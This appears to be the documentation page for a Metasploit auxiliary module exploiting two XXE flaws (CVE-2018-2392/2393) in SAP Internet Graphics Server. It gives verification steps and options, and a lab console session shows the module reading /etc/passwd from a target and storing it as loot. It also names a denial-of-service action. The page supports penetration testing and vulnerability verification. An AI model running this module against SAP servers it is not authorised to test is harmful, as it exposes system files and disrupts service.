## Vulnerable Application
This module exploits CVE-2018-2392 and CVE-2018-2393, two XXE vulnerabilities within the XMLCHART page
of SAP Internet Graphics Servers (IGS) running versions 7.20, 7.20EXT, 7.45, 7.49, or 7.53. These
vulnerabilities occur due to a lack of appropriate validation on the Extension HTML tag when
submitting a POST request to the XMLCHART page to generate a new chart.

Successful exploitation will allow unauthenticated remote attackers to read files from the server as the user
from which the IGS service is started, which will typically be the SAP admin user. Alternatively attackers
can also abuse the XXE vulnerability to conduct a denial of service attack against the vulnerable
SAP IGS server.

### Application Background
The Internet Graphics Service (IGS) where it provides a way infrastructure to enable developers to display graphics
in an internet browser with minimal effort. It has been integrated in several different SAP UI technologies
where it provides a way for data from another SAP system or data source to be utilized to generate
dynamic graphical or non-graphical output.

### Installation Steps
Steps to install and update the SAP IGS server can be found online on [this page][2].
Additional information on configuring the IGS server can be found [here][3].
Finally information on administering the IGS server can be found [here][4].

Once set up and configured, the instances will be vulnerable on the default HTTP port 40080.

## Verification Steps

  1. Start msfconsole
  1. Do: `workspace [WORKSPACE]`
  1. Do: `use auxiliary/admin/sap/sap_igs_xmlchart_xxe`
  1. Do: `set RHOSTS [IP]`
  1. Do: `set FILE [remote file name]`
  1. Do: `set action READ`
  1. Do: `check`
  1. Verify that the `check` method correctly identifies if the target is vulnerable or not.
  1. Do: `run`
  1. Verify that the contents of the file you specified were returned.

## Options

### FILE

File to read from the remote server. Example: `/etc/passwd`

### URIPATH

This is the path to the XMLCHART page of the SAP IGS server that is vulnerable to XXE.
By default it is set to `/XMLCHART`, however it can be changed if the SAP IGS server
was installed under a different path than the web root. For example if the SAP IGS
server was installed to the `/igs/` path under the web root, then this value would be
set to `/igs/XMLCHART`.

## Actions
```
   Name  Description
   ----  -----------
   READ  Remote file read
   DOS   Denial Of Service
```

## Scenarios

### Vulnerable SAP IGS release: 7.45 running on SUSE Linux Enterprise Server for SAP Applications 12 SP1

```
msf6 > workspace -a SAP_TEST
[*] Added workspace: SAP_TEST
[*] Workspace: SAP_TEST
msf6 > use auxiliary/admin/sap/sap_igs_xmlchart_xxe
msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > set RHOSTS 172.16.30.29
RHOSTS => 172.16.30.29
msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > set FILE /etc/passwd
FILE => /etc/passwd
msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > set action READ
action => READ
msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > set Proxies http:127.0.0.1:8080
Proxies => http:127.0.0.1:8080
msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > set VERBOSE true
VERBOSE => true
msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > options

Module options (auxiliary/admin/sap/sap_igs_xmlchart_xxe):

   Name     Current Setting      Required  Description
   ----     ---------------      --------  -----------
   FILE     /etc/passwd          no        File to read from the remote server
   Proxies  http:127.0.0.1:8080  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   172.16.30.29         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    40080                yes       The target port (TCP)
   SSL      false                no        Negotiate SSL/TLS for outgoing connections
   URIPATH  /XMLCHART            yes       Path to the SAP IGS XMLCHART page from the web root
   VHOST                         no        HTTP server virtual host


Auxiliary action:

   Name  Description
   ----  -----------
   READ  Remote file read


msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > check
[+] 172.16.30.29:40080 - The target is vulnerable. 172.16.30.29 running OS: SUSE Linux Enterprise Server for SAP Applications 12 SP1 returned a response indicating that its XMLCHART page is vulnerable to XXE!
msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > run
[*] Running module against 172.16.30.29

[+] File: /etc/passwd content from host: 172.16.30.29
at:x:25:25:Batch jobs daemon:/var/spool/atjobs:/bin/bash
bin:x:1:1:bin:/bin:/bin/bash
daemon:x:2:2:Daemon:/sbin:/bin/bash
ftp:x:40:49:FTP account:/srv/ftp:/bin/bash
games:x:12:100:Games account:/var/games:/bin/bash
gdm:x:107:112:Gnome Display Manager daemon:/var/lib/gdm:/bin/false
haldaemon:x:101:102:User for haldaemon:/var/run/hald:/bin/false
lp:x:4:7:Printing daemon:/var/spool/lpd:/bin/bash
mail:x:8:12:Mailer daemon:/var/spool/clientmqueue:/bin/false
man:x:13:62:Manual pages viewer:/var/cache/man:/bin/bash
messagebus:x:100:101:User for D-Bus:/var/run/dbus:/bin/false
news:x:9:13:News system:/etc/news:/bin/bash
nobody:x:65534:65533:nobody:/var/lib/nobody:/bin/bash
ntp:x:74:108:NTP daemon:/var/lib/ntp:/bin/false
polkituser:x:104:107:PolicyKit:/var/run/PolicyKit:/bin/false
postfix:x:51:51:Postfix Daemon:/var/spool/postfix:/bin/false
pulse:x:105:109:PulseAudio daemon:/var/lib/pulseaudio:/bin/false
puppet:x:103:106:Puppet daemon:/var/lib/puppet:/bin/false
root:x:0:0:root:/root:/bin/bash
sshd:x:71:65:SSH daemon:/var/lib/sshd:/bin/false
suse-ncc:x:106:111:Novell Customer Center User:/var/lib/YaST2/suse-ncc-fakehome:/bin/bash
uucp:x:10:14:Unix-to-Unix CoPy system:/etc/uucp:/bin/bash
uuidd:x:102:104:User for uuidd:/var/run/uuidd:/bin/false
wwwrun:x:30:8:WWW daemon apache:/var/lib/wwwrun:/bin/false
admin:x:1000:100:admin:/home/admin:/bin/bash
j45adm:x:1001:1001:SAP System Administrator:/home/j45adm:/bin/csh
sybj45:x:1002:1001:SAP Database Administrator:/sybase/J45:/bin/csh
sapadm:x:1003:1001:SAP System Administrator:/home/sapadm:/bin/false
[+] File: /etc/passwd saved in: /Users/vladimir/.msf4/loot/20201007131238_SAP_TEST_172.16.30.29_igs.xmlchart.xxe_346716.txt
[*] Auxiliary module execution completed
msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > services
Services
========

host          port   proto  name  state  info
----          ----   -----  ----  -----  ----
172.16.30.29  40080  tcp    http  open   SAP Internet Graphics Server (IGS)

msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > vulns

Vulnerabilities
===============

Timestamp                Host          Name                                             References
---------                ----          ----                                             ----------
2020-10-07 10:12:37 UTC  172.16.30.29  SAP Internet Graphics Server (IGS) XMLCHART XXE  CVE-2018-2392,CVE-2018-2393,URL-https://download.ernw-insight.de/troopers/tr18/slides/TR18_SAP_IGS-The-vulnerable-forgotten-component.pdf

msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > loot

Loot
====

host          service  type              name         content     info                  path
----          -------  ----              ----         -------     ----                  ----
172.16.30.29           igs.xmlchart.xxe  /etc/passwd  text/plain  SAP IGS XMLCHART XXE  /Users/vladimir/.msf4/loot/01619fd331da98b5ac4d-20201007131238_SAP_TEST_172.16.30.29_igs.xmlchart.xxe_346716.txt

```

[1]: https://download.ernw-insight.de/troopers/tr18/slides/TR18_SAP_IGS-The-vulnerable-forgotten-component.pdf
[2]: https://help.sap.com/viewer/3348e831f4024f2db0251e9daa08b783/7.5.16/en-US/4e193dbeb5c617e2e10000000a42189b.html
[3]: https://help.sap.com/viewer/3348e831f4024f2db0251e9daa08b783/7.5.16/en-US/4e1939c9b5c617e2e10000000a42189b.html
[4]: https://help.sap.com/viewer/3348e831f4024f2db0251e9daa08b783/7.5.16/en-US/4e193988b5c617e2e10000000a42189b.html
